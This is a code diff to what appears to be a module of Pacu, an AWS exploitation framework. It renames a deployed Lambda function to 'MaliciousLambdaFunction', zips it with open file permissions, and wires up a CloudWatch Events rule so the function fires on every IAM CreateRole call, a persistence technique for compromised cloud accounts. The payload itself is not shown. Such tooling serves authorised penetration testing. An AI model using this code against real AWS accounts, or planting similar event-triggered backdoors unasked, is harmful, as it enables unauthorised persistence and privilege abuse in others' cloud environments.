@@ -161,8 +161,11 @@ def main(args, pacu_main):
     # Zip the Lambda function
     try:
         print('  Zipping the Lambda function...\n')
+        zinfo = zipfile.ZipInfo('lambda_function.py')
+        zinfo.external_attr = 0o777 << 16
+
         with zipfile.ZipFile(LAMBDA_FUNCTION_ZIP_PATH, 'w', zipfile.ZIP_DEFLATED) as zip_file:
-            zip_file.writestr('lambda_function.py', source_code)
+            zip_file.writestr(zinfo, source_code)
     except Exception as error:
         print('Failed to zip the Lambda function locally: {}\n'.format(error))
         return data
@@ -173,7 +176,8 @@ def main(args, pacu_main):
     client = pacu_main.get_boto3_client('lambda', 'us-east-1')
 
     try:
-        function_name = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(15))
+        #function_name = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(15))
+        function_name = 'MaliciousLambdaFunction'
         response = client.create_function(
             FunctionName=function_name,
             Runtime='python3.9',
@@ -189,9 +193,9 @@ def main(args, pacu_main):
         created_resources['LambdaFunctions'].append(function_name)
 
         client = pacu_main.get_boto3_client('events', 'us-east-1')
-
+        rule_name = 'TriggerForMaliciousFunction'
         response = client.put_rule(
-            Name=function_name,
+            Name=rule_name,
             EventPattern='{"source":["aws.iam"],"detail-type":["AWS API Call via CloudTrail"],"detail":{"eventSource":["iam.amazonaws.com"],"eventName":["CreateRole"]}}',
             State='ENABLED'
         )
@@ -211,7 +215,7 @@ def main(args, pacu_main):
         client = pacu_main.get_boto3_client('events', 'us-east-1')
 
         response = client.put_targets(
-            Rule=function_name,
+            Rule=rule_name,
             Targets=[
                 {
                     'Id': '0',
@@ -225,7 +229,7 @@ def main(args, pacu_main):
         else:
             print('  Added Lambda target to CloudWatch Events rule.')
             data['successes'] += 1
-            created_resources['CWERules'].append(function_name)
+            created_resources['CWERules'].append(rule_name)
     except ClientError as error:
         code = error.response['Error']['Code']
         if code == 'AccessDeniedException':
